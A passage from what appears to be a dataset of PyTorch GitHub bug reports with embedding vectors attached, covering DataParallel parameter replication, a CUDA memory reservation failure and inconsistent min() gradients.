cc @SsnL",True,"[ 1.52729481e-01 -7.13776052e-03 -2.59469211e-01 -3.18324745e-01
  3.15069854e-02 -4.98492032e-01  1.08591378e-01  3.00204217e-01
 -4.00160432e-01 -1.64393038e-02 -1.04202434e-01 -1.16355881e-01
  8.51554051e-02  6.97728544e-02 -9.06978622e-02  2.38953561e-01
 -8.28651786e-02  6.77096546e-02 -1.26605213e-01 -8.69523063e-02
 -2.47794390e-01  1.76359788e-02 -1.72273815e-01  1.82911143e-01
  2.45641887e-01  1.78053662e-01 -1.33742809e-01  2.87229847e-02
  1.42062709e-01  2.31929451e-01 -7.70987272e-02  6.96819425e-02
  1.69307187e-01  2.99380690e-01 -2.14720480e-02  1.03101417e-01
 -5.36980629e-01 -3.47633362e-02 -3.19052696e-01  1.83088422e-01
 -9.35838446e-02 -4.56109941e-02 -6.55639321e-02 -9.56096798e-02
 -4.49045449e-01 -1.05146855e-01 -4.14926976e-01  4.03100640e-01
 -3.44121993e-01  9.78470780e-03  7.21922442e-02  1.42038763e-01
 -1.98409073e-02 -9.90959816e-04 -2.89408900e-02 -1.37448564e-01
 -1.20218799e-01  1.21400543e-01 -2.58376241e-01  2.98982680e-01
 -4.19790484e-02 -1.64537162e-01  2.91449763e-03 -3.33798647e-01
 -1.29072875e-01  7.22080246e-02  2.36197993e-01 -3.52013335e-02
  3.78444135e-01 -3.99822474e-01  3.20384532e-01  1.77578896e-01
 -2.63019145e-01  1.50831744e-01  3.79888713e-02  5.19161522e-02
 -1.73282728e-01  1.23563021e-01 -3.29765409e-01 -2.99059927e-01
 -5.39753675e-01  1.42168164e-01 -1.07387930e-01 -1.59056276e-01
 -1.64324462e-01 -2.27084592e-01 -2.20178545e-01 -1.97018832e-01
  2.06808463e-01  3.25589597e-01  2.64762521e-01  2.27731541e-01
 -3.38373542e-01  2.35697299e-01 -1.53914675e-01  1.87361956e-01
  2.48980418e-01  2.51824170e-01 -8.40713680e-02 -3.05667460e-01
  1.67307079e-01  1.17527070e-02 -3.02055061e-01  4.18928385e-01
  1.31331444e-01 -2.30429813e-01 -1.55582890e-01 -8.28717649e-02
 -8.81190896e-02 -2.25269403e-02  9.31586325e-02  1.04502300e-02
  2.55053163e-01 -1.27594590e-01  1.57774299e-01 -1.86833404e-02
 -4.00004387e-01  1.16328277e-01 -6.07055068e-01  1.32958069e-01
 -2.39506513e-01  1.71366021e-01 -1.92565992e-01 -2.00080033e-02
  1.80512995e-01  6.57647103e-03  6.39536791e-03 -9.62711275e-02
  2.89672673e-01  1.94986731e-01  2.93083668e-01 -1.76321529e-02
 -1.55695722e-01 -2.18165636e-01  2.68372539e-02  1.95362359e-01
 -1.49858236e-01  7.46512413e-02 -3.31671000e-01 -3.81370306e-01
 -1.96022734e-01 -3.18187661e-02  2.24932268e-01 -4.08829749e-01
 -8.05081278e-02  1.49281546e-01 -4.71966803e-01  1.94361694e-02
 -4.06318530e-03 -4.52956520e-02 -1.65848285e-01  1.47370756e-01
 -2.36203343e-01 -4.93486337e-02 -6.03101030e-02  2.81598538e-01
  4.16138083e-01  3.20784077e-02  3.12366523e-03 -2.32505709e-01
  5.56079522e-02  1.57394946e-01  2.56418556e-01 -6.26657724e-01
  9.30148065e-02  2.61108458e-01 -1.19237728e-01 -3.38139832e-02
  1.86660886e-01  2.67852023e-02  1.46223217e-01 -5.66631705e-02
 -1.50918305e-01  3.64483669e-02  2.42201909e-01  1.05111793e-01
  6.51843324e-02 -2.76264250e-01  5.21738052e-01  1.46187656e-02
  5.76314688e-01  4.03846204e-01 -2.07957268e-01  1.75464481e-01
  1.28757000e-01 -3.33022684e-01  7.72083104e-02  1.56321794e-01
 -2.56582737e-01 -6.66901916e-02 -8.14177841e-03 -2.62310892e-01
  4.25231576e-01  8.77995044e-02 -1.79589204e-02 -2.81209081e-01
 -1.26271635e-01  1.87854797e-01  2.53478438e-01  6.56582415e-02
 -9.66437310e-02  5.80840886e-01  2.71276414e-01  1.20339558e-01
  4.17742789e-01 -9.14222896e-02 -4.03292984e-01 -3.92157674e-01
 -2.98982382e-01  3.83533210e-01 -7.89047033e-02 -1.06491975e-01
 -5.09064458e-02 -3.92076969e-01  3.83899063e-02 -2.07130685e-01
  7.81008452e-02 -2.13935003e-02 -3.60629782e-02 -1.24691725e-01
  2.14643739e-02 -3.20479870e-01  7.92664960e-02 -1.36227950e-01
  1.54379830e-01  1.58267356e-02  1.15858555e-01 -2.07701787e-01
  4.46041137e-01  1.06279254e-01 -2.78896391e-02  1.44060194e-01
 -1.10774726e-01 -7.45833963e-02 -2.24459335e-01  1.37299389e-01
 -2.52977498e-02 -8.62305984e-02  3.94768342e-02  2.81988263e-01
  7.60043040e-03 -4.61222380e-02  2.98201926e-02  5.99917509e-02
  9.42017511e-02 -2.66778648e-01  2.01050997e-01 -9.02814120e-02
 -2.26126552e-01 -3.36467743e-01 -5.46954036e-01  3.80314142e-02
  4.10704494e-01 -4.22229581e-02  3.30949485e-01 -3.28655571e-01
  6.27153143e-02 -8.18472654e-02 -2.09911875e-02 -3.33821267e-01
  3.37733805e-01 -8.73616785e-02  8.52048397e-05  5.19332290e-01
 -4.09120262e-01 -4.99934703e-01 -2.72879899e-01  8.11784938e-02
  2.29469180e-01 -7.58606046e-02  1.41501427e-01  5.07966354e-02
 -1.37210146e-01  3.36797461e-02  2.57504731e-01  9.04893503e-04
  9.73456800e-02  4.24116135e-01  2.28132457e-01 -2.89961457e-01
  2.82465935e-01  1.94582924e-01  7.65886754e-02 -9.83073711e-02
  1.29546314e-01 -1.74122036e-01 -9.19834822e-02 -2.86889784e-02
 -4.16761756e-01 -6.06881082e-02  2.00005502e-01 -1.64597586e-01
 -1.76837757e-01 -4.70517017e-03 -2.74252087e-01  2.78029721e-02
  1.19683757e-01  2.31202781e-01 -1.65012449e-01 -1.12683713e-01
 -7.56099224e-02 -5.80875836e-02  4.18319143e-02  1.03626080e-01
 -5.16494095e-01  6.73916340e-02  6.16107099e-02  4.94635254e-02
  3.63802850e-01 -7.68382400e-02  1.85083508e-01  2.38056928e-01
 -3.18640590e-01  1.72467738e-01  1.43255055e-01  3.44070010e-02
  3.64531636e-01  5.57787776e-01  2.47571498e-01  1.27984896e-01
 -1.99948311e-01 -3.28316987e-01  5.43620586e-02 -8.58087167e-02
  3.89551669e-01  1.44633114e-01 -1.49348289e-01  4.54126775e-01
  8.43442697e-03  5.27472310e-02  3.60023648e-01 -1.38278812e-01
 -8.14232826e-02  1.65570080e-01  3.37744504e-03 -6.80617571e-01
  2.30325997e-01  1.35623276e-01 -4.22598980e-03  1.82921171e-01
  1.82730600e-01 -4.30243611e-02 -3.01921904e-01 -8.24308157e-01
  3.83797325e-02  9.56323557e-03 -2.14750424e-01  5.07950008e-01
 -2.46591344e-01  6.80742785e-03  1.61446303e-01  1.64785802e-01
  1.16177641e-01 -4.52572182e-02  8.97153467e-02  4.75935698e-01
  2.97203455e-02  3.10489535e-01 -2.21937656e-01  5.07149622e-02
  2.64528487e-03  3.05732101e-01 -2.17728764e-01 -2.48943325e-02
  3.74359995e-01 -1.68972433e-01 -1.37341991e-01  3.05462867e-01
  3.76320481e-01  2.16140404e-01 -3.52324665e-01  2.19178736e-01
  1.42826378e-01  2.93733031e-01  2.09844470e-01 -2.36933827e-02
 -1.01477847e-01 -2.17309743e-01  1.88206539e-01  1.71157107e-01
 -1.42090768e-01  6.11910783e-02 -5.86558171e-02 -5.62141612e-02]"
"nn.Parameter{List,Dict} not copied to gpus in forward pass when nn.DataParallel is used high priority module: nn triaged module: data parallel","## ðŸ› Bug

When I use nn.DataParallel to wrap an nn.Module X, nn.Parameter in X is not copied to gpus in the forward pass. I think nn.Parameter can be considered as a part of module parameters, so it should be treated like other nn.Module parameters in X as well. Is it an intentional design?

## To Reproduce

test.py:
```python
import sys
import torch
import torch.nn as nn
import torch.nn.functional as F


gpus = list(map(int, sys.argv[1].split(',')))


class Net(nn.Module):
    def __init__(self):
        super().__init__()

        self.alpha = nn.ParameterList()

        for i in range(4):
            self.alpha.append(nn.Parameter(1e-3*torch.randn(i+2, 5)))

        self.cnn = nn.Conv2d(1, 1, 1, 1, 1)


    def forward(self, x):
        print(self.alpha)
        print(self.cnn)
        return x


if __name__ == '__main__':
    net = Net().cuda()
    if len(gpus) > 1:
        net = nn.DataParallel(net, device_ids=gpus)

    net(torch.rand(4, 5))
```
When I run `python3 test.py 0` (which means device_id = [0]), the output is
```
ParameterList(
    (0): Parameter containing: [torch.cuda.FloatTensor of size 2x5 (GPU 0)]
    (1): Parameter containing: [torch.cuda.FloatTensor of size 3x5 (GPU 0)]
    (2): Parameter containing: [torch.cuda.FloatTensor of size 4x5 (GPU 0)]
    (3): Parameter containing: [torch.cuda.FloatTensor of size 5x5 (GPU 0)]
)
Conv2d(1, 1, kernel_size=(1, 1), stride=(1, 1), padding=(1, 1))
```
However, when I run `python3 test.py 0,1` (which means device_id = [0, 1]), the output is
```
ParameterList()
Conv2d(1, 1, kernel_size=(1, 1), stride=(1, 1), padding=(1, 1))
ParameterList()
Conv2d(1, 1, kernel_size=(1, 1), stride=(1, 1), padding=(1, 1))
```
Only nn.Module is copied to gpus in forward pass.
How can I use and train nn.Parameter just like nn.Module with nn.DataParallel?

## Expected behavior

When the nn.Module X is wrapped with nn.DataParallel, both nn.Module and nn.Parameter in X should be copied to gpus.

## Environment

PyTorch version: 1.6.0.dev20200401+cu101
Is debug build: No
CUDA used to build PyTorch: 10.1

OS: Arch Linux
GCC version: (Arch Linux 9.3.0-1) 9.3.0
CMake version: version 3.17.0

Python version: 3.8
Is CUDA available: Yes
CUDA runtime version: 10.2.89
GPU models and configuration: 
GPU 0: GeForce GTX TITAN X
GPU 1: GeForce GTX 1060 6GB

Nvidia driver version: 440.64
cuDNN version: /usr/lib/libcudnn.so.7.6.5

Versions of relevant libraries:
[pip3] numpy==1.18.2
[pip3] torch==1.6.0.dev20200401+cu101
[pip3] torchexp==0.1.0
[pip3] torchvision==0.6.0.dev20200401+cu101
[conda] Could not collect



cc @ezyang @gchanan @zou3519 @albanD @mruberry",True,"[-3.17893684e-01 -1.84543490e-01 -5.31019151e-01 -1.86733574e-01
 -1.66843981e-01 -2.41085261e-01 -1.94746498e-02  1.26579285e-01
 -3.08904946e-01 -1.49354666e-01  2.14749739e-01  1.23020716e-01
 -2.89843157e-02  2.29686707e-01  4.14165966e-02  5.02313673e-02
  6.85894489e-02  2.58848608e-01 -3.16463038e-03 -8.27473216e-03
 -9.41916928e-03  1.38994426e-01 -1.18832126e-01  2.23856911e-01
 -1.52705625e-01 -1.17073745e-01  7.62235420e-03 -2.07284540e-01
  1.96743637e-01  8.04019719e-02  9.14832577e-02  2.97268838e-01
 -6.45999551e-01  8.49413276e-02 -4.22173068e-02  1.05722681e-01
 -4.02450442e-01 -4.17119801e-01 -5.31119145e-02 -1.87653005e-01
  4.00315151e-02 -3.06336395e-02 -7.06085265e-02 -8.71448964e-02
 -6.49144650e-02 -2.13942125e-01 -2.54526019e-01  1.05033956e-01
 -1.96791187e-01 -1.45324618e-02 -1.84500217e-01 -1.80113032e-01
 -1.91768169e-01 -1.90956056e-01  2.01002657e-01 -1.23130098e-01
  1.73614323e-01 -1.47167340e-01  1.03492901e-01 -3.50298226e-01
 -5.40148206e-02 -1.80159092e-01 -6.10644072e-02  1.79400370e-02
  7.06858486e-02  3.52275558e-02 -2.98357401e-02 -1.12579025e-01
  2.94098675e-01  1.63334236e-01  5.45250364e-02  9.79383290e-02
 -4.25005615e-01 -2.51773655e-01  1.52323663e-01  1.75405800e-01
 -3.64628732e-02  3.18835348e-01 -1.08478539e-01 -4.41803455e-01
  3.66140723e-01  2.77744710e-01 -1.97642252e-01 -5.54825217e-02
  9.96452048e-02  3.60477753e-02  1.96216404e-01 -6.64301962e-02
 -1.26297668e-01  2.83924993e-02  3.97982717e-01  1.12769827e-02
 -1.48798019e-01  2.67530203e-01  3.32391500e-01  2.87794143e-01
 -7.65290335e-02  1.03622764e-01 -2.99395442e-01 -3.47146094e-01
 -2.01108813e-01 -2.54229635e-01 -1.94255739e-01  4.64117616e-01
 -1.16324775e-01 -8.02574754e-02  1.70886219e-01 -6.31324276e-02
  6.16749451e-02 -1.00682080e-01  1.81486923e-03  1.70564353e-01
  1.09985024e-01 -1.76090091e-01  1.62848905e-02  1.77113656e-02
  1.99719280e-01 -4.50935960e-02 -2.73808017e-02 -6.06261306e-02
 -1.34996042e-01  1.24228053e-01  5.66242263e-04 -7.76719972e-02
  2.10226983e-01  8.37317407e-02  5.96391447e-02 -1.70837820e-01
  1.28803328e-01 -6.18135110e-02  2.93728054e-01 -8.43133405e-03
 -3.01351119e-02 -5.67961857e-02  3.79003167e-01  4.58303317e-02
 -5.57942510e-01 -3.96101147e-01 -4.18420374e-01 -1.68937951e-01
  2.20052991e-03 -8.05390775e-02 -2.04564601e-01 -1.30100563e-01
  2.66408265e-01  2.31968418e-01 -1.22957759e-01  2.21536785e-01
  1.27538979e-01  3.34425569e-02  5.25675341e-02  2.46754959e-01
 -2.60394990e-01  1.37729263e-02 -8.23628604e-02  1.04790919e-01
  2.41834790e-01 -9.26493853e-02 -8.59103128e-02 -1.86619535e-01
  6.88245334e-03  4.94960785e-01 -6.02451041e-02  2.81490535e-01
 -7.93230087e-02  2.04046428e-01  1.53575420e-01 -3.08576263e-02
 -2.44540572e-01  6.62994236e-02 -1.01387568e-01  1.02615058e-01
 -1.47232950e-01 -1.02123901e-01  2.28126377e-01  1.10743549e-02
 -2.96927184e-01 -3.17255139e-01  8.32124054e-03  9.19826627e-02
 -2.52244063e-02  2.59889603e-01 -1.59550775e-02 -7.84563571e-02
  6.21551573e-02 -3.13032418e-02  3.62673774e-04 -6.12896308e-02
  2.30722837e-02  1.00839816e-01 -2.71870166e-01  2.08225057e-01
  2.55056024e-01  2.92230278e-01 -2.63990372e-01 -2.82263696e-01
  4.00275886e-01 -5.03848568e-02  1.05537124e-01  2.18563691e-01
 -1.74837917e-01 -7.94383809e-02  4.41408068e-01  1.07899673e-01
 -1.16464593e-01 -1.06532581e-01 -4.44603115e-02 -1.92688227e-01
 -1.26290411e-01  8.58077407e-02 -2.69872308e-01  5.96825108e-02
 -2.61535734e-01 -9.31224972e-03 -1.39489859e-01  2.51583576e-01
  5.10886461e-02 -3.34633477e-02  1.12239890e-01 -5.49095459e-02
  5.32043800e-02 -5.06519824e-02  3.08317363e-01 -1.14259407e-01
  2.15490386e-01  2.61683524e-01  1.51331529e-01  4.22995985e-01
 -4.61275578e-02  1.42607898e-01 -2.33582705e-01 -2.64126390e-01
  1.61630332e-01  2.19334699e-02  1.37247875e-01  7.87991732e-02
  2.01248497e-01  5.99064007e-02 -1.81875587e-01  3.82567570e-02
 -1.66890204e-01 -2.11748406e-01 -2.50409339e-02  4.22497988e-02
  2.13407621e-01 -3.98481637e-02 -1.83496714e-01 -2.52568517e-02
 -3.26568097e-01 -1.09161764e-01 -8.51615295e-02 -2.84502029e-01
  4.17528808e-01 -2.40489587e-01  1.16241261e-01  1.64602429e-01
  1.94238618e-01 -2.02953666e-01  1.79651938e-02  1.33161709e-01
  2.55745620e-01  2.08902508e-01 -1.29153263e-02  5.77443063e-01
  4.25631180e-02  2.69147940e-02 -4.24894579e-02  9.01177377e-02
  3.55051346e-02 -2.65905023e-01  6.81019798e-02 -1.84692755e-01
 -9.42250341e-03  1.01055384e-01  1.63589060e-01  9.01654586e-02
  2.64196038e-01 -5.89272231e-02  5.86518869e-02  1.20669536e-01
  6.52510822e-02  2.84749508e-01  1.91862226e-01  1.77955419e-01
  3.96567494e-01  9.57480222e-02 -8.60548690e-02 -3.14667076e-01
 -2.30250478e-01 -8.57785493e-02  7.98545331e-02 -1.17492408e-01
  5.42877674e-01 -7.44010955e-02 -1.65589586e-01  4.73283008e-02
  5.50756216e-01 -1.36343718e-01  2.28922874e-01 -3.22699964e-01
 -9.17818844e-02  5.23659214e-03  4.77106869e-02 -2.02531949e-01
 -1.33006558e-01 -1.50734439e-01  2.36552581e-01  2.21937358e-01
  3.93985584e-02 -2.84049690e-01  5.92286348e-01 -9.91459005e-03
 -3.29326659e-01  6.25526831e-02  1.75810158e-02 -1.77434832e-02
 -1.54904008e-01  4.35729563e-01  2.18349963e-01  1.33460820e-01
 -1.28863394e-01 -3.16433668e-01 -3.04719687e-01  5.42594343e-02
  1.45222962e-01  4.24165800e-02 -6.67279139e-02  2.06780154e-02
  1.10925689e-01  3.56775463e-01  6.57976419e-02 -4.69616614e-02
  1.84849903e-01  2.53844261e-02 -2.16573179e-01 -4.72946316e-02
 -1.33167177e-01  8.93054307e-02  1.04590327e-01  1.98815405e-01
 -3.48791569e-01  1.80737339e-02 -2.50527620e-01 -2.85459161e-01
 -7.31598586e-02 -2.24355727e-01 -1.55772984e-01  4.51825649e-01
  6.83092847e-02 -3.38855356e-01 -1.75955109e-02 -6.87501729e-02
 -1.56159282e-01 -1.51263541e-02 -1.07564300e-01  2.33857989e-01
  1.17754769e-02  6.45975024e-02  7.98220634e-02 -6.32558465e-02
 -9.93926525e-02  2.38053456e-01 -1.75677747e-01 -1.22471675e-01
  1.06828675e-01 -4.34384272e-02 -2.11792812e-02 -3.59700561e-01
  2.06005588e-01  2.31934875e-01 -1.07119307e-01  2.66148150e-01
  4.22530621e-03  4.93349433e-02  6.82897419e-02  2.92156428e-01
  1.84783693e-02  1.17897384e-01  1.87360004e-01 -1.24623209e-01
 -1.93582758e-01 -1.25208750e-01 -1.35157138e-01  1.12226456e-01]"
OOM error where ~50% of the GPU RAM cannot be utilised/reserved module: cuda module: memory usage triaged,"## ðŸ› Bug

I am experiencing the classic out of memory error where my GPU appears to have a lot of memory still available, however my scenario seems to be a little different to other, fragmentation related, issues I have seen. These other problems point to free memory being less than the reserved/cached memory quoted in the error message, but the reserved (or allocated + cached) is always close to the total capacity of the GPU. 

**In my case the reserved total is only around ~50% of the total capacity of the GPU** which seems like the caching allocator is unable to request any more, despite having plenty available and no other processes running on the card which is in exclusive mode.
```
CUDA out of memory. Tried to allocate 10.84 GiB (GPU 0; 23.65 GiB total capacity; 1.06 GiB already allocated; 10.26 GiB free; 12.53 GiB reserved in total by PyTorch)
```
The other strange thing I have noticed is if I create/delete a (smaller) dummy tensor before creating the larger tensor (which causes the OOM) it results in the reserved memory total increasing, and I am then able to successfully create my larger tensor! I have tried running `torch.cuda.empty_cache()` prior to creating the large tensor and it does not fix this issue.

## To Reproduce

This always occurs on the second iteration of my training loop. The memory pattern I see by recording `torch.cuda.memory_allocated()` and `torch.cuda.memory_reserved()` in GiB directly before and after the creation of the large (problem) tensor is:

### Failure case
**Step 0**
mem_allocated **0.651**, mem_reserved **1.680**
`z = torch.randn([320, 19, 935, 2, 256], device='cuda')`
mem_allocated **11.495**, mem_reserved **12.523**
...
**Step 1**
mem_allocated **1.061**, mem_reserved **12.529**
`z = torch.randn([320, 19, 935, 2, 256], device='cuda')`
OOM ðŸ§¨


### Working case
And in the second scenario where I create then delete a smaller tensor prior to creating the big tensor, in order to bump up the reserved memory and everything works

**Step 0**
`dummy_z = torch.randn([1024, 1024, 2048], device='cuda')`
mem_allocated **8.651**, mem_reserved **9.680** 
`del dummy_z`
`gc.collect()`
mem_allocated **0.651**, mem_reserved **9.680** 
`z = torch.randn([320, 19, 935, 2, 256], device='cuda')`
mem_allocated **11.495**, mem_reserved **20.523**
...
**Step 1**
`dummy_z = torch.randn([1024, 1024, 2048], device='cuda')`
mem_allocated **9.061**, mem_reserved **20.529** 
`del dummy_z`
`gc.collect()`
mem_allocated **1.061**, mem_reserved **20.529** 
`z = torch.randn([320, 19, 935, 2, 256], device='cuda')`
mem_allocated **11.905**, mem_reserved **20.529**
...
**Step 2...**


## Expected behavior

To reserve/utilize an amount of memory close to the total available, as I have shown in the working case without having to create/delete dummy tensors.

## Environment
```
PyTorch version: 1.4.0
Is debug build: No                                                                                                                                           
CUDA used to build PyTorch: 10.1                                                                                                                                                                                                                                                                                          
OS: Ubuntu 18.04.4 LTS                                                                                                                                       
GCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0                                                                                                           
CMake version: version 3.10.2                                                                                                                                                                                                                                                                                             
Python version: 3.7                                                                                                                                          
Is CUDA available: Yes                                                                                                                                       
CUDA runtime version: Could not collect                                                                                                                      
GPU models and configuration:                                                                                                                                
GPU 0: TITAN RTX                                                                                                                                             
GPU 1: TITAN RTX                                                                                                                                             
GPU 2: TITAN RTX                                                                                                                                             
GPU 3: TITAN RTX                                                                                                                                             
GPU 4: TITAN RTX                                                                                                                                             
GPU 5: TITAN RTX                                                                                                                                             
GPU 6: TITAN RTX                                                                                                                                             
GPU 7: TITAN RTX                                                                                                                                                                                                                                                                                                          
Nvidia driver version: 440.59                                                                                                                                
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5                                                                                                                                                                                                                                                                
Versions of relevant libraries:                                                                                                                              
[pip3] numpy==1.18.0                                                                                                                                         
[pip3] pytorch-memlab==0.0.4                                                                                                                                 
[pip3] torch==1.4.0                                                                                                                                          
[pip3] torchaudio==0.4.0                                                                                                                                     
[pip3] torchsummary==1.5.1                                                                                                                                   
[pip3] torchvision==0.4.2                                                                                                                                    
[conda] Could not collect
```

cc @ezyang @gchanan @zou3519 @ngimel",True,"[ 5.77798858e-03  2.87717823e-02 -3.95504475e-01 -8.93580690e-02
 -8.36341009e-02 -2.69744098e-01 -1.39404893e-01  1.28228962e-01
 -1.72871172e-01 -4.80583236e-02 -9.65932757e-02  1.84501439e-01
  1.18545014e-02 -1.37530953e-01 -3.36961746e-02  2.83743918e-01
  2.06869453e-01  1.69600204e-01 -3.81216481e-02  2.07462624e-01
  9.32925940e-03 -5.33946678e-02 -1.65902674e-01  1.35660283e-02
  1.49312288e-01  2.41414815e-01  1.68684516e-02 -1.32827014e-01
  2.37847447e-01 -4.96912561e-02  1.90493777e-01  1.08591616e-01
  2.41486728e-01 -1.28178388e-01  8.02675635e-02 -1.09835565e-01
 -4.34729338e-01 -5.97480774e-01 -1.85300454e-01  1.11543536e-01
  1.45357251e-01  4.33926195e-01 -2.02559531e-02  5.96104115e-02
  3.69720859e-03 -8.49940553e-02 -2.61070102e-01  2.55719781e-01
 -2.65750587e-01 -1.66858897e-01  1.84267804e-01  2.36189216e-01
 -5.94908372e-04 -3.26993912e-02 -2.92917669e-01 -2.21314043e-01
 -6.76889941e-02 -6.23228215e-02 -2.76318133e-01  2.88384676e-01
  5.09015203e-01 -2.00641811e-01  1.50130942e-01 -6.77639395e-02
  3.93491387e-02 -1.73568845e-01  2.39735678e-01 -3.14318724e-02
  5.03723800e-01  1.53240055e-01  8.86921734e-02  2.82775998e-01
 -4.45075393e-01 -2.83869654e-01  3.34375918e-01  2.64647901e-01
  2.05899477e-01  4.88926396e-02  6.75783306e-02 -4.05824959e-01
 -1.61050148e-02  2.28154659e-01  1.34728393e-02 -4.70538139e-01
  4.11320478e-03 -2.44639620e-01  2.26276100e-01  2.73745835e-01
 -9.60863382e-03 -3.41503561e-01  7.61150643e-02  3.55780244e-01
 -2.87863016e-01  3.73783372e-02  3.54462981e-01 -9.58341286e-02
  1.36898845e-01 -4.21008281e-03 -5.19434512e-01 -2.26721853e-01
  1.01752244e-01  2.66139746e-01  7.02219605e-02  4.33396339e-01
 -3.48704726e-01 -5.50008416e-02  9.99147445e-02  2.83523053e-01
 -3.21930572e-02  1.87384412e-01  1.84751719e-01  1.34412527e-01
  2.28109062e-01  2.89655238e-01 -2.32850209e-01  2.45210141e-01
 -4.93173748e-01  9.84919071e-02 -4.54031974e-01  2.66148597e-01
 -4.72605735e-01 -1.44309089e-01 -2.45769903e-01 -1.87799916e-01
 -7.34110773e-02  2.94119623e-02  9.45265964e-03 -4.36540693e-02
  9.56319198e-02 -3.96765292e-01 -5.71103394e-02 -3.90609801e-01
  7.23102167e-02 -1.26064122e-01  1.32813275e-01  2.18233645e-01
 -2.88518190e-01 -2.50925720e-01 -3.65325920e-02 -1.79002553e-01
  1.90211743e-01  6.55160546e-02 -7.61103109e-02 -3.43778521e-01
 -2.15959549e-02  5.60471416e-01  1.15504496e-01 -6.83101639e-02
  2.64886003e-02  5.32270849e-01 -1.16711438e-01  1.94288511e-02
 -4.98256654e-01  2.23638058e-01 -1.40447736e-01  5.14930859e-02
  2.00202703e-01 -1.13233730e-01 -2.57309049e-01 -3.88588667e-01
  1.43390298e-01  5.73870167e-02  2.52659142e-01  1.45346358e-01
 -1.05519323e-02  9.93435830e-02 -1.37032866e-01 -3.04118991e-01
  1.23576656e-01  2.60502666e-01  9.81676206e-03  6.19322881e-02
 -1.20414048e-01 -1.82061538e-01  5.10948420e-01 -3.85052323e-01
 -3.48781765e-01 -1.98120903e-02 -9.22663324e-03  1.89810842e-02
 -2.20516428e-01  3.48147601e-02  1.65177405e-01 -7.79437721e-02
 -1.11307921e-02  1.86553568e-01  1.59342855e-01  1.01679653e-01
 -1.39873683e-01 -1.32229030e-01 -1.70702636e-01 -2.46498764e-01
 -1.40024185e-01 -1.15094490e-01  4.57936116e-02 -1.86077327e-01
  9.67751443e-02  2.63547122e-01  1.66800603e-01  1.59082815e-01
 -2.11739708e-02 -1.48726813e-02 -1.01490781e-01  4.01643455e-01
  2.91227609e-01 -1.46956146e-02 -4.10811901e-01 -1.05643943e-01
 -1.36178672e-01 -1.53545616e-03 -2.59654727e-02  6.91730827e-02
 -3.89132529e-01 -1.38858467e-01 -1.08457254e-02  1.47888795e-01
  1.59516573e-01  1.15290932e-01  7.37148374e-02  1.28100216e-01
  3.71186584e-01 -3.48791957e-01 -4.31861952e-02 -2.09163249e-01
 -1.04723237e-01  8.48767608e-02  2.10189655e-01 -5.68138808e-02
 -3.14046890e-01  1.09352373e-01 -1.81700941e-02  6.25026971e-02
  2.83570513e-02 -2.53456265e-01 -1.88651964e-01  3.56001437e-01
  3.36690009e-01 -5.05868085e-02 -2.29895890e-01 -7.72312060e-02
 -6.63358644e-02 -2.83864170e-01 -1.58559412e-01  3.19873504e-02
  3.67234141e-01  1.08457282e-01  1.29174158e-01 -4.34082523e-02
 -1.12415291e-01  1.87369704e-01 -1.96598783e-01 -1.07965581e-01
  3.22972722e-02 -1.75431997e-01  3.21986496e-01 -2.06287354e-01
 -2.85755605e-01 -8.32608789e-02  2.86321752e-02 -2.12019354e-01
  8.68873447e-02  1.81431845e-01 -4.85718369e-01  3.57823223e-01
  2.74806023e-01  1.12942427e-01 -2.25154251e-01  1.49290234e-01
  1.61843807e-01 -2.42460936e-01  8.38382319e-02 -1.48241073e-02
  4.03345466e-01 -1.28109664e-01  1.10198617e-01 -7.66040087e-02
  4.74650264e-01 -3.28346752e-02  1.60981491e-01 -1.50723144e-01
  4.64200258e-01  8.85349065e-02  2.10053727e-01 -2.73099363e-01
  3.32127035e-01 -1.62270397e-01 -2.94408202e-01 -4.12496805e-01
 -1.58583403e-01  1.24699593e-01  1.20585933e-01 -9.73875374e-02
  1.83464423e-01  1.43597409e-01  1.11498013e-01  6.63982481e-02
  5.84072769e-02  3.05958569e-01  1.41324431e-01  1.15771323e-01
 -2.95776606e-01 -3.00464511e-01  1.60287842e-01 -2.42424160e-02
 -6.98888898e-01 -5.21370023e-02 -2.09255427e-01 -3.07902992e-02
  6.04295909e-01 -8.60622004e-02 -2.72808634e-02 -2.70797133e-01
 -2.34001994e-01 -5.49194477e-02 -1.52322516e-01  1.93952978e-01
 -3.89488935e-02  4.92038965e-01  3.47151339e-01  4.68557328e-03
 -1.02124713e-01 -4.41225201e-01 -3.53668749e-01  4.07306373e-01
  2.07802027e-01 -3.50090504e-01 -2.75902748e-01  1.19167715e-02
  1.02803253e-01  4.13798332e-01  3.05755317e-01 -2.64344633e-01
  4.49836487e-03 -4.10441101e-01 -1.94253296e-01  5.07303178e-02
 -4.89320010e-02  3.24732102e-02  9.90257785e-03 -3.10691148e-01
 -3.05000126e-01  5.13164252e-02 -8.96706618e-03 -4.50826049e-01
 -6.94284290e-02  1.42856594e-02  7.27376163e-01  5.32204032e-01
  2.48556167e-01 -3.79013002e-01  1.93801150e-01  1.49715081e-01
  3.82472098e-01 -1.81437939e-01 -5.48803806e-02  1.45311624e-01
  5.04046082e-01  3.35849017e-01  2.55046576e-01  1.30479991e-01
 -4.12628008e-03 -1.90305114e-02  1.64366573e-01  2.10136130e-01
 -2.95837224e-02 -2.25795433e-01  1.61541961e-02  3.98793340e-01
  3.32167447e-01  1.13973789e-01 -1.10464245e-01  1.67473972e-01
 -1.55433416e-01  2.26195037e-01  2.80088335e-01 -1.79488763e-01
 -2.18082905e-01 -2.46035948e-01 -7.64262453e-02  5.91082275e-02
 -2.90407270e-01 -1.22002468e-01 -1.91301748e-01  2.81544551e-02]"
backward for tensor.min() and tensor.min(dim=0) behaves differently high priority module: autograd triaged,"## Backward for `tensor.min` behaves differently if `dim` is set 

I noticed that the gradient of the `tensor.min()` function gives a different output when `dim` is set. Namely, when `dim` is set, the gradient will only correspond to one of the entries with the lowest values. If `dim` is not set, then there will be gradient for all entries which have the lowest value

## Code sample to reproduce

```
import torch
a = torch.tensor([0.1, 0.3, 0.1], dtype=torch.float32, requires_grad = True)
a_cp  = torch.tensor([0.1, 0.3, 0.1], dtype=torch.float32, requires_grad = True)
b = a.min()
b.backward()
a.grad  # Output is tensor([1., 0., 1.])
c, d = a_cp.min(dim=0)
c.backward()
a_cp.grad  # Output is tensor([0., 0., 1.])
```

## Problematic for vectorized implementations

This behavior is not expected and it leads to discrepancies in the gradients between vectorized and non implementations. Setting `dim` in `torch.min()` should not change the gradients. 



cc @ezyang @gchanan @zou3519 @SsnL @albanD @gqchen",True,"[-1.69182926e-01 -1.72560602e-01 -1.52835891e-01 -1.12681501e-01
